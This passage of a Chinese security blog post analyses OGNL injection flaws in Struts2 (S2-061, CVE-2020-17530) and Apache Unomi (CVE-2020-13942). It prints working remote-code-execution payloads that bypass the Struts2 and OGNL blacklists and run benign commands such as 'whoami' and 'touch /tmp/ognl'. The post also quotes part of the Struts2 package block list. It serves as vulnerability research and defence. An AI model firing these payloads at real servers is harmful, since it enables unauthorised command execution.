sun.reflect.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                javassist.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                org.apache.velocity.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                org.objectweb.asm.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                org.springframework.context.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                com.opensymphony.xwork2.inject.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                com.opensymphony.xwork2.ognl.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                com.opensymphony.xwork2.security.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                com.opensymphony.xwork2.util."</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造ValueStack时，在<code>com.opensymphony.xwork2.ognl.OgnlValueStack.setOgnlUtil()</code>中会设置<code>SecurityMemberAccess</code>，将<code>struts-defult.xml</code>的黑名单加载进去</p>
+<p><img src="/imgs/image-20211103110834187.png" alt="image-20211103110834187"></p>
+<p>我调试分析时用的struts2版本是2.5.25，该版本中用到的ognl版本是3.1.28，该版本的<code>OgnlRuntime.invokeMethod</code>同样做了一些黑名单限制（同“0x04-Ognl 3.2.18 测试“）。</p>
+<p><img src="/imgs/image-20211102221814529.png" alt="image-20211102221814529"></p>
+<h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#access&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#access)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#cmd&#x3D;&#123;&#39;whoami&#39;&#125;).(#execute.exec(#cmd))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据<a href="https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g" target="_blank" rel="noopener">Struts2 S2-061漏洞分析(CVE-2020-17530)</a>文章进行调试分析，总结s2-061绕过s2-059的思路主要有以下几点：</p>
+<p>1、<code>#application</code> 中的 <code>org.apache.tomcat.InstanceManager.newInstance()</code>可以实例化无参构造的类；</p>
+<p><img src="/imgs/image-20211103104954008.png" alt="image-20211103104954008"></p>
+<p>2、可以通过<code>#attr</code>和<code>com.opensymphony.xwork2.util.ValueStack.ValueStack</code>获取valuestack。<code>org.apache.commons.collections.BeanMap</code>的setBean方法设置为valuestack，这样get方法传入<code>context</code>就可以调用<code>com.opensymphony.xwork2.ognl.OgnlValueStack.getContext()</code>，然后将获取的context同样用setBean方法进行设置，get传入<code>memberAccess</code>进行获取；（关于ValueStack、OgnlContext、memberAccess和SecurityMemberAccess的关系推荐阅读Lucifaer大佬的<a href="https://paper.seebug.org/794/#22-valuestack" target="_blank" rel="noopener">浅析OGNL攻防史</a>进行了解）</p>
+<p><img src="/imgs/image-20211103120901467.png" alt="image-20211103120901467"></p>
+<p>3、获取到的memberAccess实际就是<code>com.opensymphony.xwork2.ognl.SecurityMemberAccess</code>，再利用BeanMap的put方法将SecurityMemberAccess<code>excludedClasses</code>和<code>excludedPackageNames</code>置空，这样子就绕过了struts2的黑名单；</p>
+<p><img src="/imgs/image-20211103123206409.png" alt="image-20211103123206409"></p>
+<p>4、需要注意第三点只是绕过了struts2黑名单，ognl黑名单没有被绕过，避开ognl黑名单，可以利用struts2的黑名单，其中<code>freemarker.template.utility.Execute</code>存在无参构造，<code>freemarker.template.utility.Execute.exec()</code> 方法可执行命令。</p>
+<h3 id="Apache-Unomi-CVE-2020-13942"><a href="#Apache-Unomi-CVE-2020-13942" class="headerlink" title="Apache Unomi CVE-2020-13942"></a>Apache Unomi CVE-2020-13942</h3><p>Apache Unomi CVE-2020-13942包括OGNL RCE和MVEL RCE，本文仅针对OGNL进行分析。</p>
+<p>对比1.5.1和1.5.2版本，修复该漏洞的提交<a href="https://github.com/apache/unomi/commit/0b81ba35dd3c3c2e0a92ce06592b3df90571eced" target="_blank" rel="noopener">Improve scripting security ([#179])</a>中主要对<code>org.apache.unomi.plugins.baseplugin.conditions.PropertyConditionEvaluator.java</code>、<code>SecureFilteringClassLoader.java</code>等进行了修改，并且增加了<code>ExpressionFilter.java</code>来检查表达式。</p>
+<p><img src="/imgs/image-20211104194555280.png" alt="image-20211104194555280"></p>
+<h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>unomi处理parameterValues主要在<code>org.apache.unomi.plugins.baseplugin.conditions.PropertyConditionEvaluator</code>，<code>getPropertyValue()</code>获取请求的参数值。在该方法中默认会先通过<code>getHardcodedPropertyValue()</code>处理。</p>
+<p><img src="/imgs/image-20211104155511463.png" alt="image-20211104155511463"></p>
+<p><code>getHardcodedPropertyValue()</code>中当<code>propertyName</code>不等于<code>segments</code>、<code>consents</code>、<code>properties.XXX</code>等，会返回<code>NOT_OPTIMIZED</code>，然后再通过<code>getOGNLPropertyValue()</code>处理，也就是说<code>propertyName</code>未遵照预设的结果时会按照ognl表达式处理。</p>
+<p><img src="/imgs/image-20211104155409360.png" alt="image-20211104155409360"></p>
+<p>在<code>getOGNLPropertyValue()</code>中，通过<code>accessor.get(ognlContext, item)</code>处理，这里<code>accessor</code>就是ASTChain。</p>
+<p><img src="/imgs/image-20211104162405728.png" alt="image-20211104162405728"></p>
+<p>那么最终会调用<code>ASTChain.getValue()</code>处理表达式。</p>
+<p><img src="/imgs/image-20211104162829209.png" alt="image-20211104162829209"></p>
+<p>unomi 1.5.1用的ognl版本是3.2.14，该版本在<code>OgnlRuntime.invokeMethod</code>中同样存在黑名单判断。只要表达式绕过Ognl的黑名单就可以达到目的。</p>
+<p><img src="/imgs/image-20211104163255369.png" alt="image-20211104163255369"></p>
+<p>我们来看下表达式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#runtimeclass &#x3D; #this.getClass().forName(\&quot;java.lang.Runtime\&quot;)).(#getruntimemethod &#x3D; #runtimeclass.getDeclaredMethods().&#123;^ #this.name.equals(\&quot;getRuntime\&quot;)&#125;[0]).(#rtobj &#x3D; #getruntimemethod.invoke(null,null)).(#execmethod &#x3D; #runtimeclass.getDeclaredMethods().&#123;? #this.name.equals(\&quot;exec\&quot;)&#125;.&#123;? #this.getParameters()[0].getType().getName().equals(\&quot;java.lang.String\&quot;)&#125;.&#123;? #this.getParameters().length &lt; 2&#125;[0]).(#execmethod.invoke(#rtobj,\&quot;touch &#x2F;tmp&#x2F;ognl\&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>整个的思路是用Class和Method以及Method.invoke来绕过黑名单。</p>
+<p><code>this.getClass()</code>是一个Class对象，<code>Class</code>没有在黑名单中，因此上面<code>Class.forName()</code>可以执行，同理<code>Class.forName()</code>会得到一个Class对象，因此<code>runtimeclass.getDeclaredMethods()</code>可以正常执行，并且返回Runtime的方法数组，<code>Method</code>没有在黑名单，遍历方法名获取到<code>getRuntime</code>的Method对象(不可以直接<code>getDeclaredMethod(&quot;getRuntime&quot;)</code>会报错)，利用invoke执行<code>getRuntime</code>，同理获取<code>exec</code>并执行。</p>
+<p><img src="/imgs/image-20211104164329827.png" alt="image-20211104164329827"></p>
+<p>最后顺便提一下unomi小于1.5.1版本存在CVE-2020-11975，查了下1.5.0使用的ognl版本是3.2.11，该版本<code>OgnlRuntime.invokeMethod</code>没有黑名单，这也是Runtime的payload<code>(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\&quot;calc\&quot;))</code>可以直接运行的原因。</p>
+<p><img src="/imgs/image-20211104194834108.png" alt="image-20211104194834108"></p>
+<h2 id="0x06-思考与总结"><a href="#0x06-思考与总结" class="headerlink" title="0x06 思考与总结"></a>0x06 思考与总结</h2><p>上面提到的几个OGNL漏洞的修复基本都是采用黑名单来限制OGNL注入，开发人员在使用ognl时，除了ognl需要注意使用较高版本，还要注意添加额外的防护措施。当然，使用黑名单的防护方式也许一时可以防住OGNL的RCE，但总有被绕过的风险，另外除了命令执行，文件操作、SSRF也不是没有可能。</p>
+<h2 id="0x07-参考链接："><a href="#0x07-参考链接：" class="headerlink" title="0x07 参考链接："></a>0x07 参考链接：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;commons.apache.org&#x2F;proper&#x2F;commons-ognl&#x2F;apidocs&#x2F;index.html</span><br><span class="line">https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;2046761&#x2F;what-is-object-graph-in-java</span><br><span class="line">https:&#x2F;&#x2F;developer.aliyun.com&#x2F;article&#x2F;135737</span><br><span class="line">https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6844904013683507207</span><br><span class="line">https:&#x2F;&#x2F;tech.meituan.com&#x2F;2019&#x2F;02&#x2F;14&#x2F;talk-about-java-magic-class-unsafe.html</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;httpvoid&#x2F;writeups&#x2F;blob&#x2F;main&#x2F;Confluence-RCE.md</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;8135</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yangzhinian&#x2F;p&#x2F;4885973.html</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;RD2HTMn-jFxDIs4-X95u6g</span><br><span class="line">http:&#x2F;&#x2F;velocity.apache.org&#x2F;engine&#x2F;1.7&#x2F;user-guide.html</span><br><span class="line">http:&#x2F;&#x2F;unomi.apache.org&#x2F;manual&#x2F;latest&#x2F;index.html#_javascript</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;unomi&#x2F;CVE-2020-13942&#x2F;README.zh-cn.md</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-OGNL是什么？"><span class="toc-number">2.</span> <span class="toc-text">0x01 OGNL是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-OGNL三元素"><span class="toc-number">3.</span> <span class="toc-text">0x02 OGNL三元素</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-OGNL表达式语法"><span class="toc-number">4.</span> <span class="toc-text">0x03 OGNL表达式语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#符号的使用："><span class="toc-number">4.1.</span> <span class="toc-text">符号的使用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#集合表达式："><span class="toc-number">4.2.</span> <span class="toc-text">集合表达式：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-命令执行调试分析"><span class="toc-number">5.</span> <span class="toc-text">0x04 命令执行调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ognl低版本：2-7-3测试"><span class="toc-number">5.1.</span> <span class="toc-text">Ognl低版本：2.7.3测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ognl-3-2-18-测试"><span class="toc-number">5.2.</span> <span class="toc-text">Ognl 3.2.18 测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-近期三个漏洞的分析"><span class="toc-number">6.</span> <span class="toc-text">0x05 近期三个漏洞的分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Confluence-CVE-2021-26084"><span class="toc-number">6.1.</span> <span class="toc-text">Confluence CVE-2021-26084</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#velocity模板引擎语法："><span class="toc-number">6.1.1.</span> <span class="toc-text">velocity模板引擎语法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析："><span class="toc-number">6.1.2.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-CVE-2020-17530（S2-061）"><span class="toc-number">6.2.</span> <span class="toc-text">Struts2 CVE-2020-17530（S2-061）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts2防护机制"><span class="toc-number">6.2.1.</span> <span class="toc-text">Struts2防护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析：-1"><span class="toc-number">6.2.2.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Unomi-CVE-2020-13942"><span class="toc-number">6.3.</span> <span class="toc-text">Apache Unomi CVE-2020-13942</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析：-2"><span class="toc-number">6.3.1.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-思考与总结"><span class="toc-number">7.</span> <span class="toc-text">0x06 思考与总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考链接："><span class="toc-number">8.</span> <span class="toc-text">0x07 参考链接：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&text=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&is_video=false&description=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一文读懂OGNL漏洞&body=Check out this article: https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&title=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&name=一文读懂OGNL漏洞&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://r17a-17.github.io/2021/11/20/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82OGNL%E6%BC%8F%E6%B4%9E/&t=一文读懂OGNL漏洞" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
